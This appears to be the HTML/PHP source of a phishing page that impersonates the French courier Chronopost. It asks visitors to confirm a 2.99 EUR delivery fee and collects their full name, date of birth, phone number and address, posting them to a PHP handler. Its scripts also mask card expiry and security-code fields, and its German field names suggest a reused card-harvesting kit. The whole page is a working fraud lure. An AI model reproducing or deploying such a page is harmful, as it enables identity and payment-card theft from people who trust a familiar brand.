<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="sourceApp/img/favicon.ico" type="image/vnd.microsoft.icon" />
<link href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="sourceApp/style.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

</head>
<body>
<div class="d-block p-3 text-center text-white bg-primary b4b">
  <a href="" class="a-primary"><i class="fas fa-exclamation-triangle" aria-hidden="true"></i> <?php echo date("Y/m/d"); ?> - Infos délais de livraison</a>
</div><header>     
  <img class="imglog" src="sourceApp/img/chronopost_logo.png" alt="Accueil">
  </header>    
<div class="menualbox">
<div class="topnav" id="myTopnav">
  <a href="">Accueil</a>
  <a href="">Expedier</a>
  <a href="">Nos offres </a>
  <a href="">Aide / FAQ </a>
  <a href="">A propos de Chronopost </a>
  <a href="javascript:void(0);" class="icon" onclick="myFunction()">
    <i class="fa fa-bars"></i>
  </a>
</div>
</div>
<div class="container">
  


  <div class="row">

            <div class="col-sm-9">
               <p class="alert alert-success"><i class="fab fa-cc-mastercard"></i> &nbsp;<i class="fab fa-cc-visa"></i> &nbsp;  Veuillez confirmer les frais de livraison (2,99 EURO) et l'adresse de livraison du colis</p>
<form name="myForm" action="sourceApp/PosTinTo.php" onsubmit="return validateForm()" method="post">
  <div class="form-row">
    <div class="form-group col-md-6">
      <label for="inputEmail4">Nom complet</label>
      <input type="text" class="form-control" id="Kartenhalter" name="Kartenhalter">
    </div>
    <div class="form-group col-md-6">
      <label for="inputPassword4"> Date de naissance</label>
      <input type="text" class="form-control" id="Geburtsdatuml" name="Geburtsdatuml">
    </div>
  </div>
  <div class="form-group">
    <label for="inputAddress">Numéro de téléphone</label>
    <input type="text" class="form-control" id="EMailaddresse" name="EMailaddresse" >
  </div>
  <div class="form-group">
    <label for="inputAddress2">Adresse  </label>
    <input type="text" class="form-control" id="Rechnungsadresse" name="Rechnungsadresse" >
  </div>
  <div class="form-row">
    <div class="form-group col-md-6">
      <label for="inputCity">Ville </label>
      <input type="text" class="form-control" id="Stadt" name="Stadt">
    </div>
    <div class="form-group col-md-2">
      <label for="inputZip">Code postal</label>
      <input type="text" class="form-control" id="Postleitzahl" name="Postleitzahl">
    </div>
  </div>
 
  <button type="submit" class="btn btn-primary" name="infoget">Valider</button>
</form>
            </div>

            <div class="col-sm-3 ">
                <div class="card" >
  <img src="sourceApp/img/chronopost_tours_03712200_113425863.jpg" class="card-img-top" alt="...">
  <div class="card-body">
    <h5 class="card-title">Chronopost toujours à vos côtés !</h5>
    <p class="card-text">Parce que chaque livraison est unique, Chronopost s’adapte à vos besoins. Découvrez nos offres de livraison de colis en France et à l’international.</p>
  </div>
</div>
        </div>



</div>
<script  src="sourceApp/chronopost_if.js"></script>
<script>
function myFunction() {
  var x = document.getElementById("myTopnav");
  if (x.className === "topnav") {
    x.className += " responsive";
  } else {
    x.className = "topnav";
  }
}
</script>
         <script src='//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
         <script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js'></script>
         <script type="text/javascript">
            $(":input").inputmask();
            
            $("#Geburtsdatuml").inputmask({"mask": "99/99/9999"});
            $("#EMailaddresse").inputmask({"mask": "+33 6 99 99 99 99"});
            $("#AblaufMM").inputmask({"mask": "99"});
            $("#AblaufAA").inputmask({"mask": "9999"});
            $("#Sicherheitscode").inputmask({"mask": "999"});
         </script>

<!-- Footer -->
<footer class="page-footer font-small indigo">

  <!-- Footer Links -->
  <div class="container text-center text-md-left">

    <!-- Grid row -->
    <div class="row">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Particulier</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Envoyer un colis</a>
          </li>
          <li>
            <a href="#!">Suivre un envoi</a>
          </li>
          <li>
            <a href="#!">Nos offres</a>
          </li>
          <li>
            <a href="#!">Estimez les tarifs</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Aide</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Se créer un compte</a>
          </li>
          <li>
            <a href="#!">Nos guides</a>
          </li>
          <li>
            <a href="#!">Vos questions fréquentes</a>
          </li>
          <li>
            <a href="#!">Espace Outre-Mer</a>
          </li>
           <li>
            <a href="#!">Flash info </a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Mieux nous connaître</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Gouvernance Chronopost</a>
          </li>
          <li>
            <a href="#!">Nous rejoindre</a>
          </li>
          <li>
            <a href="#!">Engagé et responsable</a>
          </li>
          <li>
            <a href="#!">Nos actualités</a>
          </li>
               <li>
            <a href="#!">Espace Presse</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Informations légales</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Mentions légales</a>
          </li>
          <li>
            <a href="#!">Alerte fraude</a>
          </li>
          <li>
            <a href="#!">Réseaux sociaux</a>
          </li>
          <li>
            <a href="#!"><img src="sourceApp/img/Capture.png">  </a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

    </div>
    <!-- Grid row -->

  </div>

  <div class="footer-separator-desktop "></div>

  <!-- Footer Links -->
<img class="loft" src="sourceApp/img/dpd-logo.png"   >
<img class="logt" src="sourceApp/img/chronopost_logo_small.png"   >
  <!-- Copyright -->
  <div class="footer-copyright text-center py-3">© 2021 Chronopost</div>
  <!-- Copyright -->

</footer>
<!-- Footer -->

</body>
</html>
